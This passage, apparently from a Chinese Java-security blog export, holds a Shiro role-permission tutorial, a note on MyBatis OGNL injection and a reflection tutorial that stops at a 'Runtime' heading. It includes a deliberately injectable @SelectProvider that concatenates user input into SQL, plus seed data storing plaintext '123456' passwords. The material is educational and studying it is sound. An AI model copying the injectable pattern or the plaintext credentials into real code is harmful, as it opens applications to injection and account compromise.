class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for perm</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `perm`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `perm`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `permission` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `ps<span class="operator">-</span>name` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `pid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">5</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of perm</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `perm` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;user:add&#x27;</span>, <span class="string">&#x27;增&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `perm` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;user:update&#x27;</span>, <span class="string">&#x27;改&#x27;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `perm` <span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="string">&#x27;user:select&#x27;</span>, <span class="string">&#x27;查&#x27;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `perm` <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">&#x27;user:delete&#x27;</span>, <span class="string">&#x27;删&#x27;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for role</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `role`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `role`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `role` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `roleName` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `rid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">3</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of role</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;管理员&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;普通用户&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for role_perm</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `role_perm`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `role_perm`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `rid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `pid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">8</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROW_FORMAT <span class="operator">=</span> Fixed;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of role_perm</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_perm` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_perm` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_perm` <span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_perm` <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_perm` <span class="keyword">VALUES</span> (<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_perm` <span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_perm` <span class="keyword">VALUES</span> (<span class="number">7</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for role_user</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `role_user`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `role_user`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `uid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `rid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">3</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROW_FORMAT <span class="operator">=</span> Fixed;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of role_user</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_user` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `role_user` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `users`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `users`  (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">255</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `rid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE <span class="operator">=</span> MyISAM AUTO_INCREMENT <span class="operator">=</span> <span class="number">6</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">=</span> utf8 <span class="keyword">COLLATE</span> <span class="operator">=</span> utf8_general_ci ROW_FORMAT <span class="operator">=</span> <span class="keyword">Dynamic</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2）编写查询角色和权限的mapper</p>
<p>mapper接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String getUserRole(int id);</span><br><span class="line"></span><br><span class="line">public List&lt;String&gt; getRolePerms(int id);</span><br></pre></td></tr></table></figure>
<p>实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select id=&quot;getUserRole&quot; resultType=&quot;java.lang.String&quot;&gt;</span><br><span class="line">    select role from role where rid = (select rid from role_user where uid = #&#123;id&#125;)</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;select id=&quot;getRolePerms&quot; resultType=&quot;java.lang.String&quot;&gt;</span><br><span class="line">    SELECT DISTINCT p.permission</span><br><span class="line">    FROM users u</span><br><span class="line">             JOIN role_user ru ON u.id = ru.uid</span><br><span class="line">             JOIN role_perm rp ON ru.rid = rp.rid</span><br><span class="line">             JOIN perm p ON rp.pid = p.pid</span><br><span class="line">    WHERE u.id = #&#123;id&#125;;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<p>3）编写其对应的service</p>
<p>接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String getUserRole(int id);</span><br><span class="line">public List&lt;String&gt; getRolePerms(int id);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public String getUserRole(int id) &#123;</span><br><span class="line">    String role=userMapper.getUserRole(id);</span><br><span class="line">    return role;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public List&lt;String&gt; getRolePerms(int id) &#123;</span><br><span class="line">    List&lt;String&gt; perms = userMapper.getRolePerms(id);</span><br><span class="line">    return perms;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4）修改自定义的Realm中<code>doGetAuthorizationInfo</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123;</span><br><span class="line">    System.out.println(&quot;执行了 -&gt; 授权 doGetAuthorizationInfo&quot;);</span><br><span class="line">    //1 创建对象，存储当前登录的用户的权限和角色</span><br><span class="line">    SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();</span><br><span class="line">    //2 获取用户id</span><br><span class="line">    User p = (User) principals.getPrimaryPrincipal();</span><br><span class="line">    Integer uid = p.getId();</span><br><span class="line">    //3 查询角色</span><br><span class="line">    String userRole = userService.getUserRole(uid);</span><br><span class="line">    //4 查询权限</span><br><span class="line">    List&lt;String&gt; rolePerms = userService.getRolePerms(uid);</span><br><span class="line">    //5 存储角色</span><br><span class="line">    info.addRole(userRole);</span><br><span class="line">    //6 存储权限</span><br><span class="line">    info.addStringPermissions(rolePerms);</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5）添加几个页面用来测试权限认证</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/admin&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testAdmin</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;您是管理员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/add&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;add&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/update&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">update</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;update&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/select&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">select</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;select&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/delete&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;delete&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>6）shiro过滤器对这几个页面添加拦截</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/08/65c3d2649b2af.png"  alt="image-20240208025635561"></p>
<p>7）测试</p>
<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a class="link"   href="https://springdoc.cn/spring-boot-old-version/" >start.spring.io 创建旧版本的 Spring Boot 项目 - spring 中文网 (springdoc.cn)<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.w3cschool.cn/shiro/co4m1if2.html" >https://www.w3cschool.cn/shiro/co4m1if2.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1NE411i7S8/?p=3&spm_id_from=pageDriver&vd_source=a87aa255c633969d5a832002c64b8adc" >SpringBoot整合Shiro环境搭建_哔哩哔哩_bilibili<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_60223449/article/details/127143064" >https://blog.csdn.net/weixin_60223449/article/details/127143064<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/phith0n/JavaThings/tree/master/shirodemo" >https://github.com/phith0n/JavaThings/tree/master/shirodemo<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>javaSec</tag>
      </tags>
  </entry>
  <entry>
    <title>MyBatis中Ognl引起的RCE</title>
    <url>/blog/2024/02/12/240212MyBatis%E4%B8%ADOgnl%E5%BC%95%E8%B5%B7%E7%9A%84RCE/</url>
    <content><![CDATA[<p>过完年了，继续肝</p>
<p>记录一个新学到的知识<code>MyBatis中Ognl引起的RCE</code></p>
<p><a class="link"   href="https://forum.butian.net/share/1749" >奇安信攻防社区-从一道CTF题浅谈MyBatis与Ognl的那些事 (butian.net)<i class="fas fa-external-link-alt"></i></a></p>
<p>之前没见过，记录一下。</p>
<p>就是mybatis中的在生成sql使用的是<code>$&#123;&#125;</code>、<code>#&#123;&#125;</code>蛮，并且mysql支持ognl表达式</p>
<p>在封装sql时会解析<code>$&#123;&#125;</code>中的内容，然后导致ognl表达式</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/12/65ca1377c6392.png"  alt="image-20240212204750908"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/12/65ca137c75c52.png"  alt="image-20240212204755984"></p>
<p>常见的场景一般是如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select id=&quot;getUserByUserName&quot; parameterType=&quot;String&quot; resultMap=&quot;User&quot;&gt;</span><br><span class="line">    select * from users where username like $&#123;username&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<p>Mybatis的设计者在设计之初就考虑到了这一个风险，实际情况在解析时只会解析原有的${username},解析完毕后再把用户输入的值赋予给他。避免了RCE的利用。</p>
<p>所以总结一下，实战中貌似很鸡肋。因为需要<code>使用Provider注解指定某个工具类的方法来动态编写SQL</code>，才能利用</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SelectProvider(type = FindUserByName.class, method = &quot;getUser&quot;)</span><br><span class="line">List&lt;User&gt; getUserByUserName(String name);</span><br><span class="line"></span><br><span class="line">class FindUserByName &#123;</span><br><span class="line">    public String getUser(String name) &#123;</span><br><span class="line">        String s = new SQL() &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                SELECT(&quot;*&quot;);</span><br><span class="line">                FROM(&quot;users&quot;);</span><br><span class="line">                WHERE(&quot;username=&#x27;&quot; + name+&quot;&#x27;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.toString();</span><br><span class="line">        return s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开发中应该几乎没有人会这样吧！</p>
]]></content>
      <tags>
        <tag>javaSec</tag>
      </tags>
  </entry>
  <entry>
    <title>反射</title>
    <url>/blog/2024/02/13/240212%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="0x01-反射的作用"><a href="#0x01-反射的作用" class="headerlink" title="0x01 反射的作用"></a>0x01 反射的作用</h2><p><strong>让java具有动态性</strong></p>
<blockquote>
<p>修改已有对象的属性</p>
<p>动态生成对象</p>
<p>动态调用方法</p>
<p>操作内部类和私有方法</p>
</blockquote>
<p>java是一个强语言，比如一个字符串，常见出来时字符串类型，就改变不了了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String name=&quot;zahngsan&quot;;</span><br></pre></td></tr></table></figure>

<p>通过反射的话我们就可以改变他</p>
<h2 id="0x02-简单案例"><a href="#0x02-简单案例" class="headerlink" title="0x02 简单案例"></a>0x02 简单案例</h2><p>通俗的理解一下：反射就是操作class，通过得到其class然后做出一些操作</p>
<p>以person类为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name = &quot;</span> + name + <span class="string">&quot;, age = &quot;</span> + age + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>获取原型class</p>
<p>执行构造方法</p>
<p>获取成员属性   … 做一些操作</p>
<p>获取成员方法   … 做一些操作</p>
</blockquote>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fddc2ebf36.png"  alt="image-20231018212937580"> </p>
<p>从原型class实例化对象</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fdec8cdcff.png"  alt="image-20231018213359511"> </p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fded44b409.png"  alt="image-20231018213410975"> </p>
<p>密码p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe077652b8.png"  alt="image-20231018214109999"> </p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe2f09dc12.png"  alt="image-20231018215143312"> </p>
<p>通过set方法，修改他的属性值</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe10d8e41e.png"  alt="image-20231018214340255"> </p>
<p>set方法需要传入两个参数</p>
<ul>
<li>第一个参数是修改谁的值，需要传入的是<strong>类的实例</strong></li>
<li>第二个参数是要改成的值</li>
</ul>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe1c580527.png"  alt="image-20231018214644183"> </p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe325d9a25.png"  alt="image-20231018215236547"> </p>
<p>继续修改它的age值</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe40691915.png"  alt="image-20231018215621257"> </p>
<p>很尴尬，报错了（因为他是私有属性private）</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe43799655.png"  alt="image-20231018215710228"></p>
<p>那么有办法解决吗？  嘿嘿，肯定有</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe4aeead33.png"  alt="image-20231018215909578"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe4d056244.png"  alt="image-20231018215942973"></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe4eba0c25.png"  alt="image-20231018220010295">  </p>
<p>继续调用方法</p>
<p>由于person里边没有定义方法，我们先添加一个方法</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe9a76e64f.png"  alt="image-20231018222021838"> </p>
<p>继续利用反射执行这个方法</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fe9fa78ef3.png"  alt="image-20231018222144696"> </p>
<p>我们在执行构造方法的时候就指明了参数类型，这里我们没有指定类型，那他会不会识别。</p>
<p>运行看看，不出意外报错了</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fea5da977c.png"  alt="image-20231018222324061"></p>
<p>所以我们要告诉他参数类型（如果是私有的我们还要setAccessible修改权限）</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652fead25be6f.png"  alt="image-20231018222520850"> </p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/10/18/652feade66ff2.png"  alt="image-20231018222532570"> </p>
<p><strong>完整代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取person的class</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">//从原型class实例化对象</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//无参构造</span></span><br><span class="line"><span class="comment">c.newInstance();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//有参构造</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;qwe&quot;</span>, <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取类中的属性name</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFile</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(nameFile);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改属性</span></span><br><span class="line">nameFile.set(p,<span class="string">&quot;asd&quot;</span>);</span><br><span class="line"><span class="comment">//System.out.println(p);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取类中的属性age</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">ageFile</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"><span class="comment">//修改权限</span></span><br><span class="line">ageFile.setAccessible(<span class="literal">true</span>);</span><br><span class="line">ageFile.set(p,<span class="number">18</span>);</span><br><span class="line"><span class="comment">//        System.out.println(p);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">eat</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;eat&quot;</span>,String.class);</span><br><span class="line"><span class="comment">//执行方法</span></span><br><span class="line">eat.invoke(p,<span class="string">&quot;炸鸡&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x03-Runtime"><a href="#0x03-Runtime" class="headerlink" title="0x03 Runtime"></a>0x03 Runtime</h2><p>01、正常执行</p>
